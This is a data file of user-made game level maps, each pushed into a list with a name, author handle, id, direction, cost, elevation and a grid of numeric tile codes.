maps.push({name="Doorhug to Death",author="ZpLit",id="#1666835220",direction="forward",cost=168,elevation=-8,map=[0,0,0,0,0,0,0,0,13,2,2,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,13,13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,94,22,13,13,13,13,22,94,0,0,0,0,0,0,0,0,0,0,0,0,93,22,13,20,20,13,22,93,0,0,0,0,0,0,0,0,0,0,0,0,22,22,13,20,20,13,22,22,0,0,0,0,0,0,0,0,0,0,87,13,33,91,13,13,13,13,91,33,13,87,0,0,0,0,0,0,0,0,13,13,33,91,13,13,13,13,91,33,13,13,0,0,0,0,0,0,0,0,33,33,0,0,23,52,52,23,0,0,33,33,0,0,0,0,0,0,0,0,34,34,0,0,22,51,51,22,0,0,34,34,0,0,0,0,0,0,0,0,35,35,0,0,21,50,50,21,0,0,35,35,0,0,0,0,0,0,0,0,36,36,0,0,20,49,49,20,0,0,36,36,0,0,0,0,0,0,0,0,36,36,0,0,19,48,48,19,0,0,36,36,0,0,0,0,0,0,0,0,35,35,0,0,18,47,47,18,0,0,35,35,0,0,0,0,0,0,0,0,34,34,0,0,17,46,46,17,0,0,34,34,0,0,0,0,0,0,0,0,33,33,0,0,16,45,45,16,0,0,33,33,0,0,0,0,0,0,0,0,13,13,32,31,11,95,95,11,31,32,13,13,0,0,0,0,0,0,0,0,87,13,32,31,11,85,85,11,31,32,13,87,0,0,0,0,0,0,0,0,0,0,18,17,16,45,45,16,17,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,2,2,88,0,0,0,0,0,0,0,0]});
maps.push({name="Corrupt a Wish",author="ZpLit",id="#1666846199",direction="forward",cost=346,elevation=0,map=[0,0,0,0,0,0,0,20,13,2,2,13,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,13,13,13,13,20,0,0,0,0,0,0,0,0,0,0,0,0,0,20,21,14,14,14,14,21,20,0,0,0,0,0,0,0,0,20,20,20,20,54,114,15,15,15,15,114,54,20,20,20,20,0,0,0,20,54,91,54,20,54,114,15,15,15,15,114,54,20,54,91,54,20,0,0,20,91,20,91,20,91,22,15,15,15,15,22,91,20,91,20,91,20,0,0,20,54,20,54,20,54,22,15,15,15,15,22,54,20,54,20,54,20,0,0,20,91,20,91,20,91,22,15,15,15,15,22,91,20,91,20,91,20,0,0,20,54,20,54,91,54,22,15,15,15,15,22,54,91,54,20,54,20,0,0,20,97,20,22,22,22,22,15,15,15,15,22,22,22,22,20,97,20,0,0,20,54,22,76,76,76,76,15,15,15,15,76,76,76,76,22,54,20,0,0,20,54,22,76,22,22,22,22,15,15,22,22,22,22,76,22,54,20,0,0,20,54,22,76,22,0,0,22,16,16,22,0,0,22,76,22,54,20,0,0,20,54,22,76,22,22,22,1,16,16,1,22,22,22,76,22,54,20,0,0,20,54,22,15,15,16,87,0,0,0,0,87,16,15,15,22,54,20,0,0,20,54,22,15,15,16,87,0,0,0,0,87,16,15,15,22,54,20,0,0,20,54,22,22,22,23,24,24,13,13,24,24,23,22,22,22,54,20,0,0,20,86,54,55,56,57,58,58,96,96,58,58,57,56,55,54,86,20,0,0,0,20,20,21,22,23,24,24,13,13,24,24,23,22,21,20,20,0,0,0,0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0]});
maps.push({name="Overdefend or Die",author="ZpLit",id="#1666846530",direction="left",cost=272,elevation=0,map=[0,0,94,0,0,0,93,94,0,0,0,0,0,0,0,0,0,0,2,2,0,94,40,40,41,42,23,23,44,38,92,41,0,0,0,0,0,0,5,5,0,0,39,0,0,0,95,9,9,0,0,24,0,0,0,0,0,0,5,5,0,30,30,95,30,29,95,9,9,29,92,52,51,0,0,0,0,0,5,5,0,30,0,30,1,1,9,9,9,0,0,24,30,0,0,0,0,0,5,5,0,31,0,31,1,1,28,28,0,0,29,49,30,0,0,0,0,0,25,25,0,32,95,32,1,1,27,27,0,0,0,0,0,0,0,0,0,0,25,25,1,1,91,1,0,1,26,26,0,11,11,11,11,11,0,0,0,0,25,25,1,1,91,1,0,1,25,25,11,45,45,45,45,45,11,0,0,14,9,25,2,5,32,1,0,1,5,5,45,45,12,12,12,45,45,25,25,10,12,25,2,5,25,1,0,1,5,5,45,45,12,12,12,45,45,25,25,25,10,25,1,1,91,1,0,1,25,25,11,45,45,45,45,45,11,0,0,25,13,25,1,1,91,1,0,1,26,26,0,11,11,11,11,11,0,0,0,25,11,25,0,25,95,25,1,1,27,27,0,0,0,0,0,0,0,0,0,25,25,25,0,26,0,26,1,1,28,28,0,0,0,28,27,12,13,14,0,0,0,0,0,27,0,27,1,1,9,9,9,29,0,0,24,23,22,15,0,0,0,0,0,28,28,95,28,29,95,9,3,52,92,0,52,18,17,16,0,0,0,0,0,0,33,0,0,0,95,9,9,29,0,0,24,23,22,15,0,0,0,0,0,93,34,34,35,36,17,17,0,0,0,28,27,12,13,14,0,0,0,0,0,0,93,0,0,0,93,94,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Airborne",author="Applily",id="#1666941603",direction="forward",cost=215,elevation=2,map=[0,0,0,0,5,135,1,96,96,2,2,12,1,0,0,0,0,0,0,0,0,0,0,0,5,97,1,131,96,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,36,3,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,129,130,130,130,130,130,130,135,135,135,135,0,0,0,0,36,36,36,36,36,0,0,0,0,0,0,0,0,0,0,135,0,0,0,0,36,132,36,36,36,0,1,1,1,1,0,0,0,0,0,135,0,0,0,0,36,36,36,36,36,0,1,93,93,65,0,0,0,0,0,135,0,0,0,0,0,0,0,36,36,0,1,65,65,65,0,0,0,0,0,135,0,0,0,0,0,0,0,36,36,98,0,24,24,24,0,0,0,0,0,135,0,0,0,0,0,0,0,36,36,98,36,36,36,133,0,0,0,0,0,135,0,0,0,0,0,0,0,36,36,98,0,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,135,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,0,0,10,135,10,0,0,0,0,0,0,0,1,134,134,134,134,134,134,1,0,0,10,99,10,0,0,0,0,0,0,0,1,Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),1,0,0,10,10,10,0,0,0,0,0,0,0,1,Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),Vector(254,172,199),1,0,0,0,133,0,0,0,0,0,0,0,0,1,Vector(250,171,189),141,141,141,141,Vector(254,172,199),1,0,0,0,0,0,0,0,0,0,0,0,0,1,Vector(253,172,197),Vector(254,172,199),2,2,Vector(254,172,199),Vector(254,172,199),1,0,0,0,0,0,0,0]});
maps.push({name="Shambles",author="Block",id="#1667002432",direction="forward",cost=281,elevation=0,map=[0,0,0,9,9,0,9,9,2,2,9,9,0,18,0,9,9,9,0,0,0,0,9,0,0,0,0,0,9,9,0,9,0,9,9,9,0,0,9,9,127,9,9,0,9,1,1,0,0,0,0,24,1,9,9,0,0,0,1,127,130,18,0,16,9,0,0,17,9,9,0,9,0,13,9,9,9,0,0,130,130,0,9,9,9,9,9,0,1,1,18,0,9,9,9,19,9,9,0,130,130,9,9,9,21,21,9,9,9,9,9,9,9,0,0,9,9,9,0,130,130,0,9,9,9,9,9,13,9,9,0,13,0,1,0,9,21,9,9,130,130,0,18,9,13,0,9,0,9,9,0,0,9,9,9,9,0,0,9,130,0,0,9,9,0,0,9,9,9,9,9,9,9,0,9,9,0,16,9,9,0,1,9,0,24,0,13,18,9,9,0,13,0,0,19,9,0,0,0,9,0,9,9,9,9,9,0,0,0,0,0,0,21,0,9,9,9,9,9,9,0,9,0,19,0,9,0,21,9,9,18,0,0,9,9,9,15,0,0,9,0,9,0,0,0,9,9,0,9,9,0,1,0,9,0,130,9,0,13,127,9,0,0,0,0,13,9,9,9,9,0,0,9,9,130,130,9,9,0,9,9,0,16,9,9,9,9,0,0,0,9,9,9,0,130,130,0,9,0,9,9,9,9,9,21,0,24,0,9,9,0,0,0,24,0,130,16,9,0,9,0,0,0,9,0,0,15,0,9,9,1,0,19,0,9,9,9,9,0,9,9,0,17,9,9,13,0,0,9,9,0,0,0,0,9,0,0,0,0,9,9,1,0,0,9,0,0,24,9,9,24,0,0,18,9,0,1,0,0,9,9,0,9,9,9,9,9,9,2,2,9,9,9,9,9,9,9,9,9,128]});
maps.push({name="watch ur steps",author="chinny",id="#1667003663",direction="forward",cost=278,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,28,28,0,0,0,0,0,0,0,0,0,0,0,0,34,34,0,0,0,28,92,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,0,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,0,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,28,0,0,0,34,28,34,28,34,28,34,28,34,28,34,28,34,28,34,92,28,0,0,0,34,34,0,0,0,0,0,0,0,0,0,0,0,0,28,28,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Avoid Long Path",author="FL00D",id="#1667017931",direction="left",cost=105,elevation=10,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,131,9,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,2,19,19,19,19,19,19,19,19,19,132,1,0,0,0,0,0,0,0,0,2,19,19,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,19,19,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,132,1,0,0,0,0,0,0,0,0,0,0,0,19,19,19,19,19,19,19,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Around and Up",author="FL00D",id="#1667017988",direction="left",cost=162,elevation=18,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,45,45,45,45,45,45,45,45,0,0,2,23,57,57,57,57,57,57,57,0,45,45,45,45,45,45,45,45,0,0,2,23,57,57,57,57,57,57,57,0,45,45,0,0,0,0,30,30,0,0,0,0,17,17,0,0,0,57,57,0,45,45,0,0,0,0,29,29,0,0,0,0,17,17,0,0,0,57,57,0,45,45,0,0,0,0,28,28,0,0,0,0,17,17,0,0,0,57,57,0,45,45,0,0,0,0,27,27,0,0,0,0,17,17,0,0,0,57,57,0,45,45,0,0,0,0,26,26,0,0,0,0,17,17,0,0,0,57,57,0,45,45,45,45,45,45,45,45,0,0,0,0,17,17,0,0,0,57,57,0,45,45,45,45,45,45,45,45,0,0,0,0,17,17,0,0,0,57,57,0,0,0,0,0,0,0,111,111,0,0,0,0,17,17,0,0,0,57,57,0,0,0,0,0,0,0,111,111,0,0,0,0,17,17,0,0,0,57,57,0,0,0,0,0,0,0,111,111,0,0,0,0,17,17,0,0,0,57,57,0,0,0,0,0,0,0,111,111,0,0,0,0,38,38,0,0,0,57,57,0,0,0,0,0,0,0,111,111,0,0,0,0,39,39,40,41,42,57,57,57,116,116,115,114,113,112,111,111,0,0,0,0,39,39,40,41,42,57,57,57,116,116,115,114,113,112,111,111,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors 4",author="FL00D",id="#1667018048",direction="right",cost=146,elevation=0,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,97,38,0,32,32,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,38,38,0,32,32,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,12,12,52,52,52,52,52,52,52,52,52,52,52,112,112,112,1,0,0,0,12,12,52,52,52,52,52,52,52,52,52,52,52,112,112,112,1,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,1,112,112,1,0,0,0,12,12,34,36,38,0,0,0,0,0,0,0,0,1,96,96,112,2,0,0,12,12,34,36,38,0,0,0,0,0,0,0,0,1,96,96,112,2,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,1,112,112,1,0,0,0,12,12,52,52,52,52,52,52,52,52,52,52,52,112,112,112,1,0,0,0,12,12,52,52,52,52,52,52,52,52,52,52,52,112,112,112,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,38,38,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,97,38,0,32,32,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="High Jumps",author="FL00D",id="#1667018253",direction="forward",cost=346,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,0,1,140,140,140,140,140,140,140,140,1,0,0,0,0,0,0,0,0,0,1,1,140,140,140,140,140,140,140,140,1,1,0,0,0,0,0,0,0,0,1,12,140,140,140,140,140,140,140,140,12,1,0,0,0,0,0,0,0,0,1,12,1,1,1,1,1,1,1,1,12,1,0,0,0,0,0,0,0,0,1,12,1,12,94,12,12,93,12,1,12,1,0,0,0,0,0,0,0,0,1,12,12,12,12,12,12,12,12,12,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="High Jumps",author="FL00D",id="#1667018284",direction="forward",cost=616,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,1,1,1,1,12,12,12,12,12,12,12,12,12,12,12,1,1,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,140,1,0,0,1,12,12,140,140,140,140,140,140,140,140,140,140,140,140,12,12,1,0,0,1,12,12,140,140,140,140,140,140,140,140,140,140,140,140,12,12,1,0,0,1,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,12,1,0,0,1,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,0,0,1,1,1,1,1,1,1,12,12,12,12,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Third Floor",author="FL00D",id="#1667018554",direction="forward",cost=240,elevation=12,map=[0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,12,1,0,0,1,46,46,46,46,46,46,46,46,46,46,46,46,46,46,92,12,1,0,0,1,46,46,46,46,46,46,46,46,46,46,46,46,46,46,46,12,1,0,0,1,46,46,46,46,46,46,46,46,46,46,46,46,46,46,92,12,1,0,0,1,112,112,112,112,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,1,52,52,52,52,52,52,52,52,52,52,52,52,52,52,92,18,1,0,0,1,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,18,1,0,0,1,52,52,52,52,52,52,52,52,52,52,52,52,52,52,92,18,1,0,0,1,52,52,52,52,52,52,52,52,52,52,52,52,52,52,52,18,1,0,0,0,18,18,18,18,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Parking Garage",author="FL00D",id="#1667018925",direction="right",cost=304,elevation=-10,map=[0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,20,20,1,110,110,110,110,110,110,1,0,0,0,0,0,0,0,0,0,0,20,20,1,110,110,110,110,110,110,1,1,1,1,1,1,1,0,0,0,0,20,20,1,110,110,110,1,1,1,1,114,114,115,116,116,1,0,0,0,0,20,20,92,110,110,110,110,110,110,1,114,114,115,116,116,1,0,0,0,0,20,20,1,110,110,110,110,110,110,1,113,113,1,117,117,1,0,0,0,0,20,20,92,110,110,110,1,1,1,1,112,112,1,118,118,1,0,0,0,0,20,20,1,110,110,110,110,110,110,1,111,111,1,118,97,1,0,0,0,0,20,20,92,110,110,110,110,110,110,1,110,110,1,1,1,1,0,0,0,0,20,20,1,110,110,110,1,1,1,1,110,110,1,0,0,0,0,0,0,0,20,20,92,110,110,110,110,110,110,1,91,91,1,1,1,1,0,0,0,0,20,20,1,110,110,110,110,110,110,110,110,110,110,110,96,10,10,10,0,0,0,0,1,110,110,110,110,110,110,110,110,110,110,110,96,10,10,10,0,0,0,0,1,110,110,110,110,110,110,110,110,110,110,110,96,10,10,10,2,0,0,0,1,110,110,1,110,110,1,110,110,1,110,110,96,10,10,10,2,0,0,0,1,110,110,1,110,110,1,110,110,1,110,110,96,10,10,10,0,0,0,0,1,110,110,1,110,110,1,110,110,1,110,110,96,10,10,10,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Unfinished Uphills",author="FL00D",id="#1667018970",direction="forward",cost=229,elevation=19,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,25,25,25,25,0,0,39,39,39,39,39,85,39,39,39,39,0,0,0,0,25,0,25,25,0,0,39,39,85,39,39,39,39,39,85,39,0,0,0,0,25,25,25,25,0,0,85,39,39,39,39,39,39,39,39,39,0,0,0,0,26,26,26,0,0,0,39,39,39,39,85,39,85,39,39,85,0,0,0,0,27,27,27,27,0,0,40,40,40,40,0,0,39,39,39,39,0,0,0,0,28,0,28,28,0,0,0,41,41,41,0,0,38,38,38,38,0,0,0,0,29,29,29,29,0,0,42,42,42,42,0,0,37,37,37,37,0,0,0,0,30,30,30,30,0,0,43,0,43,43,0,0,36,36,36,36,0,0,0,0,30,30,30,30,0,0,44,44,44,44,0,0,35,35,35,35,0,0,0,0,85,30,30,30,0,0,44,44,44,85,0,0,35,35,35,35,0,0,0,0,30,30,85,30,0,0,85,44,44,44,0,0,35,35,85,35,0,0,0,0,85,30,30,30,0,0,44,44,85,44,0,0,35,85,35,35,0,0,0,0,30,30,30,85,0,0,44,44,85,44,0,0,35,35,35,85,0,0,0,0,30,85,30,30,0,0,85,44,44,44,0,0,85,35,35,35,34,33,32,31,30,30,30,30,0,0,44,44,44,44,0,0,35,35,35,35,34,0,32,31,30,85,85,30,0,0,44,44,44,44,0,0,35,35,85,35,34,33,32,0,30,85,30,30,0,0,44,44,44,44,0,0,35,35,35,35,34,33,32,31,30,30,30,30,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Prop Room 5",author="FL00D",id="#1667032728",direction="left",cost=353,elevation=15,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,5,5,0,0,0,0,1,120,120,120,120,120,120,1,105,105,105,105,105,105,105,105,1,0,0,0,1,120,90,120,90,120,120,1,105,105,90,105,90,105,90,105,1,0,2,20,120,120,90,90,90,90,120,1,105,90,105,90,105,90,105,105,1,0,2,20,120,120,90,120,90,120,120,1,105,105,90,105,90,105,90,105,1,0,0,0,1,90,90,90,90,90,120,1,105,90,105,90,105,90,105,105,1,0,0,0,1,120,90,120,90,120,120,1,105,105,90,105,90,105,90,105,1,0,0,0,1,90,90,90,90,90,120,1,105,90,105,90,105,90,105,105,1,0,0,0,1,120,90,120,90,120,120,1,105,105,105,105,105,105,105,105,1,0,0,0,1,90,90,90,90,90,120,1,106,106,1,1,1,1,1,1,1,0,0,0,1,120,90,120,90,120,120,1,107,107,108,109,110,111,112,112,1,0,0,0,1,90,90,90,90,90,120,1,107,107,108,109,110,111,112,112,1,0,0,0,1,120,120,120,120,120,120,1,107,107,108,109,110,111,112,112,1,0,0,0,1,120,120,120,91,91,91,1,1,1,1,1,1,1,112,112,1,0,0,0,1,120,120,120,91,120,120,119,118,117,116,115,114,113,112,112,1,0,0,0,1,120,120,120,91,120,120,119,118,117,116,115,114,113,112,112,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Prop Room 6",author="FL00D",id="#1667032893",direction="right",cost=281,elevation=-10,map=[0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,124,124,124,124,124,124,1,114,114,114,114,114,114,1,0,0,0,0,0,1,124,90,90,90,90,124,1,114,90,90,90,90,114,1,0,0,0,0,0,1,124,90,124,124,90,124,1,114,90,90,90,90,114,114,14,2,0,0,0,1,124,90,124,124,90,124,1,114,90,90,90,90,114,114,14,2,0,0,0,1,124,90,90,90,90,124,1,114,90,90,90,90,114,1,0,0,0,0,0,1,124,124,124,124,124,124,1,114,114,114,114,114,114,1,0,0,0,0,0,1,19,19,19,19,19,19,1,0,0,0,0,0,0,1,0,0,0,0,0,1,119,119,119,119,119,119,14,114,114,114,114,114,114,1,0,0,0,0,0,1,119,90,90,90,90,119,14,114,90,90,90,90,114,1,0,0,0,0,0,1,119,90,90,90,90,119,14,114,90,90,90,90,114,1,0,0,0,0,0,1,119,119,119,90,90,119,14,114,90,90,114,114,114,1,0,0,0,0,0,1,94,119,119,90,90,119,14,114,90,90,114,114,93,1,0,0,0,0,0,1,119,94,119,119,119,119,14,114,114,114,114,93,114,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Need Two Floors 9",author="FL00D",id="#1667032947",direction="left",cost=126,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,0,0,0,0,0,0,52,52,52,52,52,52,52,52,0,0,0,0,12,12,0,0,0,0,0,0,52,52,52,52,52,52,52,52,0,0,0,0,12,12,0,0,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,14,12,0,0,0,0,100,32,52,52,0,0,0,0,52,52,0,0,0,0,16,12,0,0,0,0,32,32,52,52,0,0,0,0,52,52,0,0,0,0,18,12,0,0,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,12,12,0,0,0,0,38,38,52,52,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,100,38,52,52,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,0,0,52,52,0,0,0,0,52,52,0,0,0,0,52,52,0,2,12,12,12,12,52,52,0,0,0,0,52,52,52,52,52,52,52,52,0,2,12,12,12,12,52,52,0,0,0,0,52,52,52,52,52,52,52,52,0,0,0,0,0,0,0,0,0,0,0,0,0,32,32,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,32,0,38,100,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
